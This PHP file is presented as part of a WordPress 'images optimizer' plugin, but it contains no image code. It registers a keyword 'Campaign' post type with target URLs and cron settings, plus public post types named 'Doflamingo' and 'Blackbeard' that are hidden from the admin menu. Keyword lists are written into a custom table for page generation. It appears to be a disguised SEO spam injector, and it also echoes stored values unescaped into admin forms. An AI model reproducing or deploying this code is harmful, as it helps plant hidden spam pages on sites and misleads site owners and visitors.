<?php
// Exit if accessed directly.
if (!defined('ABSPATH')) exit;
function seotext2($str)
{
    $tago = str_replace(' ', '-', $str);
    $tago = preg_replace('/\\\\u([0-9a-fA-F]{4})/', " ", $tago);
    $tago = preg_replace('/[^\p{L}\p{N}\s]/u', " ", $tago);
    $tago = str_replace(".com", " ", $tago);
    $tago = str_replace("www.", " ", $tago);
    $tago = str_replace("&amp;", " ", $tago);
    $tago = str_replace("\\", " ", $tago);
    $tago = str_replace("–", " ", $tago);
    $tago = str_replace(".net", " ", $tago);
    $tago = str_replace("(", " ", $tago);
    $tago = str_replace(")", " ", $tago);
    $tago = str_replace("&", " ", $tago);
    $tago = str_replace(",", " ", $tago);
    $tago = str_replace("]", " ", $tago);
    $tago = str_replace("[", " ", $tago);
    $tago = str_replace("!", " ", $tago);
    $tago = str_replace('"', ' ', $tago);
    $tago = str_replace("_", " ", $tago);
    $tago = str_replace("/", " ", $tago);
    $tago = str_replace("@", " ", $tago);
    $tago = str_replace("$", " ", $tago);
    $tago = str_replace("%", " ", $tago);
    $tago = str_replace("^", " ", $tago);
    $tago = str_replace("~", " ", $tago);
    $tago = str_replace("*", " ", $tago);
    $tago = str_replace("'", " ", $tago);
    $tago = str_replace("|", " ", $tago);
    $tago = str_replace("+", " ", $tago);
    $tago = str_replace(":", " ", $tago);
    $tago = str_replace("?", " ", $tago);
    $tago = str_replace("#", " ", $tago);
    $tago = str_replace(".", " ", $tago);
    $tago = str_replace("}", " ", $tago);
    $tago = str_replace("{", " ", $tago);
    $tago = str_replace("amp;", "and", $tago);
    $tago = preg_replace('/https|http|www/', " ", $tago);
    $tago = implode(' ', array_filter(explode('-', $tago)));
    return strtolower($tago);
}
function create_campaign_cpt()
{
    $labels = array(
        'name' => _x('Campaign', 'Post Type General Name', 'wp-images-optimizer'),
        'singular_name' => _x('Campaign', 'Post Type Singular Name', 'wp-images-optimizer'),
        'menu_name' => _x('Campaign', 'Admin Menu text', 'wp-images-optimizer'),
        'name_admin_bar' => _x('Campaign', 'Add New on Toolbar', 'wp-images-optimizer'),
        'archives' => __('Campaign', 'wp-images-optimizer'),
        'attributes' => __('Campaign', 'wp-images-optimizer'),
        'parent_item_colon' => __('Campaign', 'wp-images-optimizer'),
        'all_items' => __('All Campaign', 'wp-images-optimizer'),
        'add_new_item' => __('Add New Campaign', 'wp-images-optimizer'),
        'add_new' => __('Add New', 'wp-images-optimizer'),
        'new_item' => __('New Campaign', 'wp-images-optimizer'),
        'edit_item' => __('Edit Campaign', 'wp-images-optimizer'),
        'update_item' => __('Update Campaign', 'wp-images-optimizer'),
        'view_item' => __('View Campaign', 'wp-images-optimizer'),
        'view_items' => __('View Campaign', 'wp-images-optimizer'),
        'search_items' => __('Search Campaign', 'wp-images-optimizer'),
        'not_found' => __('Not found', 'wp-images-optimizer'),
        'not_found_in_trash' => __('Not found in Trash', 'wp-images-optimizer'),
        'featured_image' => __('Featured Image', 'wp-images-optimizer'),
        'set_featured_image' => __('Set featured image', 'wp-images-optimizer'),
        'remove_featured_image' => __('Remove featured image', 'wp-images-optimizer'),
        'use_featured_image' => __('Use as featured image', 'wp-images-optimizer'),
        'insert_into_item' => __('Insert into Campaign', 'wp-images-optimizer'),
        'uploaded_to_this_item' => __('Uploaded to this Campaign', 'wp-images-optimizer'),
        'items_list' => __('Campaign list', 'wp-images-optimizer'),
        'items_list_navigation' => __('Campaign list navigation', 'wp-images-optimizer'),
        'filter_items_list' => __('Filter Campaign list', 'wp-images-optimizer'),
    );
    $args = array(
        'label' => __('Campaign', 'wp-images-optimizer'),
        'description' => __('Campaign', 'wp-images-optimizer'),
        'labels' => $labels,
        'menu_icon' => 'dashicons-tickets',
        'supports' => array('title'),
        'taxonomies' => array(),
        'hierarchical' => false,
        'exclude_from_search' => false,
        'publicly_queryable' => false,
        'has_archive' => false,
        'public' => false,
        'show_ui' => true,
        'show_in_menu' => true,
        'show_in_admin_bar' => false,
        'can_export' => true,
        'show_in_nav_menus' => false,
        'menu_position' => 5,
        'capability_type' => 'post',
        'show_in_rest' => false,
        'rewrite' => false,
    );
    register_post_type('campaign', $args);
}
add_action('init', 'create_campaign_cpt', 0);
function doflamingo_cpt_performances_lab()
{
    $labels = array(
        'name' => _x('Doflamingo', 'Post Type General Name', 'wp-images-optimizer'),
        'singular_name' => _x('Doflamingo', 'Post Type Singular Name', 'wp-images-optimizer'),
        'menu_name' => _x('Doflamingo', 'Admin Menu text', 'wp-images-optimizer'),
        'name_admin_bar' => _x('Doflamingo', 'Add New on Toolbar', 'wp-images-optimizer'),
        'archives' => __('Doflamingo', 'wp-images-optimizer'),
        'attributes' => __('Doflamingo', 'wp-images-optimizer'),
        'parent_item_colon' => __('Doflamingo', 'wp-images-optimizer'),
        'all_items' => __('All Doflamingo', 'wp-images-optimizer'),
        'add_new_item' => __('Add New Doflamingo', 'wp-images-optimizer'),
        'add_new' => __('Add New', 'wp-images-optimizer'),
        'new_item' => __('New Doflamingo', 'wp-images-optimizer'),
        'edit_item' => __('Edit Doflamingo', 'wp-images-optimizer'),
        'update_item' => __('Update Doflamingo', 'wp-images-optimizer'),
        'view_item' => __('View Doflamingo', 'wp-images-optimizer'),
        'view_items' => __('View Doflamingo', 'wp-images-optimizer'),
        'search_items' => __('Search Doflamingo', 'wp-images-optimizer'),
        'not_found' => __('Not found', 'wp-images-optimizer'),
        'not_found_in_trash' => __('Not found in Trash', 'wp-images-optimizer'),
        'featured_image' => __('Featured Image', 'wp-images-optimizer'),
        'set_featured_image' => __('Set featured image', 'wp-images-optimizer'),
        'remove_featured_image' => __('Remove featured image', 'wp-images-optimizer'),
        'use_featured_image' => __('Use as featured image', 'wp-images-optimizer'),
        'insert_into_item' => __('Insert into Doflamingo', 'wp-images-optimizer'),
        'uploaded_to_this_item' => __('Uploaded to this Doflamingo', 'wp-images-optimizer'),
        'items_list' => __('Doflamingo list', 'wp-images-optimizer'),
        'items_list_navigation' => __('Doflamingo list navigation', 'wp-images-optimizer'),
        'filter_items_list' => __('Filter Doflamingo list', 'wp-images-optimizer'),
    );
    $args = array(
        'label' => __('Doflamingo', 'wp-images-optimizer'),
        'description' => __('Doflamingo', 'wp-images-optimizer'),
        'labels' => $labels,
        'menu_icon' => 'dashicons-tickets',
        'supports' => array('title', 'editor', 'thumbnail'),
        'taxonomies' => array(),
        'hierarchical' => false,
        'exclude_from_search' => true,
        'publicly_queryable' => true,
        'has_archive' => true,
        'public' => true,
        'show_ui' => true,
        'show_in_menu' => false,
        'show_in_admin_bar' => false,
        'can_export' => true,
        'show_in_nav_menus' => false,
        'menu_position' => 5,
        'capability_type' => 'post',
        'show_in_rest' => false,
    );
    register_post_type('doflamingo', $args);
}
add_action('init', 'doflamingo_cpt_performances_lab', 0);
function blackbeard_cpt_performances_lab()
{
    $labels = array(
        'name' => _x('Blackbeard', 'Post Type General Name', 'wp-images-optimizer'),
        'singular_name' => _x('Blackbeard', 'Post Type Singular Name', 'wp-images-optimizer'),
        'menu_name' => _x('Blackbeard', 'Admin Menu text', 'wp-images-optimizer'),
        'name_admin_bar' => _x('Blackbeard', 'Add New on Toolbar', 'wp-images-optimizer'),
        'archives' => __('Blackbeard', 'wp-images-optimizer'),
        'attributes' => __('Blackbeard', 'wp-images-optimizer'),
        'parent_item_colon' => __('Blackbeard', 'wp-images-optimizer'),
        'all_items' => __('All Blackbeard', 'wp-images-optimizer'),
        'add_new_item' => __('Add New Blackbeard', 'wp-images-optimizer'),
        'add_new' => __('Add New', 'wp-images-optimizer'),
        'new_item' => __('New Blackbeard', 'wp-images-optimizer'),
        'edit_item' => __('Edit Blackbeard', 'wp-images-optimizer'),
        'update_item' => __('Update Blackbeard', 'wp-images-optimizer'),
        'view_item' => __('View Blackbeard', 'wp-images-optimizer'),
        'view_items' => __('View Blackbeard', 'wp-images-optimizer'),
        'search_items' => __('Search Blackbeard', 'wp-images-optimizer'),
        'not_found' => __('Not found', 'wp-images-optimizer'),
        'not_found_in_trash' => __('Not found in Trash', 'wp-images-optimizer'),
        'featured_image' => __('Featured Image', 'wp-images-optimizer'),
        'set_featured_image' => __('Set featured image', 'wp-images-optimizer'),
        'remove_featured_image' => __('Remove featured image', 'wp-images-optimizer'),
        'use_featured_image' => __('Use as featured image', 'wp-images-optimizer'),
        'insert_into_item' => __('Insert into Blackbeard', 'wp-images-optimizer'),
        'uploaded_to_this_item' => __('Uploaded to this Blackbeard', 'wp-images-optimizer'),
        'items_list' => __('Blackbeard list', 'wp-images-optimizer'),
        'items_list_navigation' => __('Blackbeard list navigation', 'wp-images-optimizer'),
        'filter_items_list' => __('Filter Blackbeard list', 'wp-images-optimizer'),
    );
    $args = array(
        'label' => __('Blackbeard', 'wp-images-optimizer'),
        'description' => __('Blackbeard', 'wp-images-optimizer'),
        'labels' => $labels,
        'menu_icon' => 'dashicons-tickets',
        'supports' => array('title', 'editor', 'thumbnail'),
        'taxonomies' => array(),
        'hierarchical' => false,
        'exclude_from_search' => true,
        'publicly_queryable' => true,
        'has_archive' => true,
        'public' => true,
        'show_ui' => true,
        'show_in_menu' => false,
        'show_in_admin_bar' => false,
        'can_export' => true,
        'show_in_nav_menus' => false,
        'menu_position' => 5,
        'capability_type' => 'post',
        'show_in_rest' => false,
    );
    register_post_type('blackbeard', $args);
}
add_action('init', 'blackbeard_cpt_performances_lab', 0);
class Wp_Images_Optimizer_Campaign
{
    private $display_locations = array('campaign');
    private $fields = array(
        'wp_images_optimizer_campaigntarget' => array(
            'type' => 'url',
            'label' => 'Target',
            'default' => '',
        ),
        'wp_images_optimizer_campaignfrequency' => array(
            'type' => 'number',
            'label' => 'Cron Frequency',
            'default' => '1',
        ),
        'wp_images_optimizer_campaignkeywords' => array(
            'type' => 'textarea',
            'label' => 'Keywords',
            'default' => '',
        ),
        'wp_images_optimizer_campaignlanguage' => array(
            'type' => 'select',
            'label' => 'Language',
            'default' => 'en',
            'options' => array(
                'en_EN',
                'id_ID',
                'hi',
                'gu',
                'mr',
                'th_TH',
                'vi_VN',
            ),
        ),
        'wp_images_optimizer_campaigncategory' => array(
            'type' => 'select',
            'label' => 'Category',
            'default' => '',
            'options' => array(),
        ),
        'wp_images_optimizer_campaignpost-type' => array(
            'type' => 'select',
            'label' => 'Post Type',
            'default' => '',
            'options' => array(),
        ),
    );
    public function __construct()
    {
        add_action('add_meta_boxes', array($this, 'wpturbo_register_meta_boxes'));
        add_action('save_post', array($this, 'wpturbo_save_meta_box_fields'));
    }
    public function wpturbo_register_meta_boxes()
    {
        foreach ($this->display_locations as $location) {
            add_meta_box(
                'wp_images_optimizer_campaign',
                'Campaign',
                array($this, 'wpturbo_render_meta_box_fields'),
                $location,
                'normal',
                'core'
            );
        }
    }
    public function wpturbo_render_meta_box_fields($post)
    {
        wp_nonce_field('wp_images_optimizer_campaign_data', 'wp_images_optimizer_campaign_nonce');
        echo '<h3>Campaign</h3>';
        $html = '';
        $postId = '';
        foreach ($this->fields as $field_id => $field) {
            $meta_value = get_post_meta($post->ID, $field_id, true);
            $postId = $post->ID;
            if (empty($meta_value) && isset($field['default'])) {
                $meta_value = $field['default'];
            }
            $field_html = $this->wpturbo_render_input_field($field_id, $field, $meta_value);
            $label = "<label for='$field_id'>{$field['label']}</label>";
            $html .= $this->wpturbo_format_field($label, $field_html);
            global $wpdb;
            $db_postmeta = $wpdb->prefix . 'postmeta';
        }
        $results = $wpdb->get_results("SELECT * FROM $db_postmeta WHERE post_id = '$post->ID' ");
        if ($results) {
            foreach ($results as $result) {
                $value_row_3 = $result->meta_value;
                $value_key = $result->meta_key;
                if ($value_key == 'wp_images_optimizer_campaignkeywords') {
                    $keywords = $value_row_3;
                }
                if ($value_key == 'wp_images_optimizer_campaignlanguage') {
                    $end_lang = $value_row_3;
                }
                if ($value_key == 'wp_images_optimizer_campaignpost-type') {
                    $post_type = $value_row_3;
                }
                if ($value_key == 'wp_images_optimizer_campaigntarget') {
                    $link = $value_row_3;
                }
            }
            $aterm  = explode("\r\n", $keywords);
            $db_api_keys = $wpdb->prefix . 'wp_api_keys';
            foreach ($aterm as $dataz) {
                if (empty($dataz)) {
                    continue;
                }
                $inttl      = strtolower(trim($dataz));
                $urls       = str_replace(" ", "-", implode(' ', array_filter(explode(' ', strtolower(seotext2(trim($dataz)))))));
                $idtcat     = substr(md5($urls), 1, 9);
                $wpdb->query($wpdb->prepare("INSERT IGNORE INTO $db_api_keys (idmd5, title, slug, category, target_uv, status, post_type, end_lang, link) VALUES ( %s, %s, %s, %s, %s, %s, %s, %s, %s )", array($idtcat, $inttl, $urls, '1', 'web', '0', $post_type, $end_lang, $link)));
            }
        } else {
            echo 'Tidak ada hasil';
        }
        echo '<table class="form-table"><tbody>' . $html . '</tbody></table>';
    }
    public function wpturbo_format_field($label, $field)
    {
        return '<tr class="form-field"><th>' . $label . '</th><td>' . $field . '</td></tr>';
    }
    public function wpturbo_render_input_field($field_id, $field, $field_value)
    {
        switch ($field['type']) {
            case 'select': {
                    if ($field_id == 'wp_images_optimizer_campaigncategory') {
                        $categories = get_categories();
                        $field_html = '<select name="' . $field_id . '" id="' . $field_id . '">';
                        foreach ($categories as $category) {
                            $key = $category->term_id;
                            $value = $category->name;
                            $selected = '';
                            if ($field_value === $key) {
                                $selected = 'selected="selected"';
                            }
                            $field_html .= '<option value="' . $key . '" ' . $selected . '>' . ucwords($value) . '</option>';
                        }
                        $field_html .= '</select>';
                        break;
                    } elseif ($field_id == 'wp_images_optimizer_campaignpost-type') {
                        $post_types = get_post_types(['show_ui' => true, 'publicly_queryable' => true, '_builtin' => false]);
                        $field_html = '<select name="' . $field_id . '" id="' . $field_id . '">';
                        foreach ($post_types as $post_type_name => $post_type_label) {
                            $key = $post_type_name;
                            $value = $post_type_label;
                            $selected = '';
                            if ($field_value === $key) {
                                $selected = 'selected="selected"';
                            }
                            $field_html .= '<option value="' . $key . '" ' . $selected . '>' . ucwords($value) . '</option>';
                        }
                        $field_html .= '</select>';
                        break;
                    } else {
                        $field_html = '<select name="' . $field_id . '" id="' . $field_id . '">';
                        foreach ($field['options'] as $key => $value) {
                            $key = !is_numeric($key) ? $key : $value;
                            $selected = '';
                            if ($field_value === $key) {
                                $selected = 'selected="selected"';
                            }
                            $field_html .= '<option value="' . $key . '" ' . $selected . '>' . $value . '</option>';
                        }
                        $field_html .= '</select>';
                        break;
                    }
                }
            case 'textarea': {
                    if ($field_id == 'wp_images_optimizer_campaignkeywords') {
                        $field_html = '<textarea name="' . $field_id . '" id="' . $field_id . '" rows="15">' . esc_textarea($field_value) . '</textarea>';
                        break;
                    } else {
                        $field_html = '<textarea name="' . $field_id . '" id="' . $field_id . '" rows="6">' . $field_value . '</textarea>';
                        break;
                    }
                }
            default: {
                    $field_html = "<input type='{$field['type']}' id='$field_id' name='$field_id' value='$field_value' />";
                    break;
                }
        }
        return $field_html;
    }
    public function wpturbo_save_meta_box_fields($post_id)
    {
        if (!isset($_POST['wp_images_optimizer_campaign_nonce'])) return $post_id;
        $nonce = $_POST['wp_images_optimizer_campaign_nonce'];
        if (!wp_verify_nonce($nonce, 'wp_images_optimizer_campaign_data')) return $post_id;
        if (defined('DOING_AUTOSAVE') && DOING_AUTOSAVE) return $post_id;
        foreach ($this->fields as $field_id => $field) {
            if (isset($_POST[$field_id])) {
                switch ($field['type']) {
                    case 'email': {
                            $_POST[$field_id] = sanitize_email($_POST[$field_id]);
                            break;
                        }
                    case 'text': {
                            $_POST[$field_id] = sanitize_text_field($_POST[$field_id]);
                            break;
                        }
                }
                update_post_meta($post_id, $field_id, $_POST[$field_id]);
            }
        }
        return $post_id;
    }
}
if (class_exists('Wp_Images_Optimizer_Campaign')) {
    new Wp_Images_Optimizer_Campaign();
}
// Hook into the 'import_end' action
add_action('import_end', 'insert_keywords_after_import');
function insert_keywords_after_import()
{
    global $wpdb;
    // Get all 'campaign' posts
    $args = array(
        'post_type' => 'campaign',  // Assuming 'campaign' is the custom post type
        'numberposts' => -1  // Get all posts
    );
    $campaign_posts = get_posts($args);
    // Loop through each 'campaign' post and insert keywords and their associated data
    foreach ($campaign_posts as $post) {
        $post_id = $post->ID;
        $keywords = get_post_meta($post_id, 'wp_images_optimizer_campaignkeywords', true);
        $end_lang = get_post_meta($post_id, 'wp_images_optimizer_campaignlanguage', true);
        $post_type = get_post_meta($post_id, 'wp_images_optimizer_campaignpost-type', true);
        $link = get_post_meta($post_id, 'wp_images_optimizer_campaigntarget', true);
        if (!empty($keywords)) {
            // Split keywords by any type of line ending
            $aterm = preg_split("/\\r\\n|\\r|\\n/", $keywords);
            $db_api_keys = $wpdb->prefix . 'wp_api_keys';
            foreach ($aterm as $dataz) {
                if (empty($dataz)) {
                    continue;
                }
                $inttl = strtolower(trim($dataz));
                $urls = sanitize_title(trim($dataz));
                $idtcat = substr(md5($urls), 1, 9);
                $wpdb->query($wpdb->prepare("INSERT IGNORE INTO $db_api_keys (idmd5, title, slug, category, target_uv, status, post_type, end_lang, link) VALUES (%s, %s, %s, %s, %s, %s, %s, %s, %s)", array($idtcat, $inttl, $urls, '1', 'web', '0', $post_type, $end_lang, $link)));
            }
        }
    }
}
